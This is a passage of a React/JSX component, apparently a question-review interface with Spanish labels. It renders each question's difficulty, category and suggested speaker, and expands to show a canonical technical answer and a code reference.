                        Pregunta #{q.id}
                      </span>
                      <div className="flex items-center gap-1.5">
                        <Badge variant={q.difficulty === "CRITICA" ? "danger" : "brand"}>{q.difficulty}</Badge>
                        <Badge variant="brand">{q.category}</Badge>
                      </div>
                    </div>

                    <div className="font-bold text-sm text-slate-900 dark:text-white leading-snug">
                      {q.question}
                    </div>

                    <div className="text-xs text-slate-500 flex items-center gap-1">
                      <Users className="w-3.5 h-3.5 text-indigo-500" />
                      Responde: <strong className="text-slate-700 dark:text-slate-300">{q.suggestedSpeaker}</strong>
                    </div>

                    {isSelected && (
                      <motion.div
                        initial={{ opacity: 0, height: 0 }}
                        animate={{ opacity: 1, height: "auto" }}
                        className="pt-3 border-t border-slate-200 dark:border-slate-700 space-y-2"
                      >
                        <div className="text-xs font-bold text-emerald-600 dark:text-emerald-400">
                          Respuesta Técnica Canónica:
                        </div>
                        <p className="text-xs text-slate-700 dark:text-slate-300 leading-relaxed bg-white dark:bg-slate-900 p-3 rounded-lg border border-slate-200 dark:border-slate-800">
                          {q.canonicalAnswer}
                        </p>
                        <div className="text-[11px] font-mono text-indigo-500">
                          Referencia en Código: {q.codeReference}
                        </div>
                      </motion.div>
                    )}
                  </button>
                );
              })}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
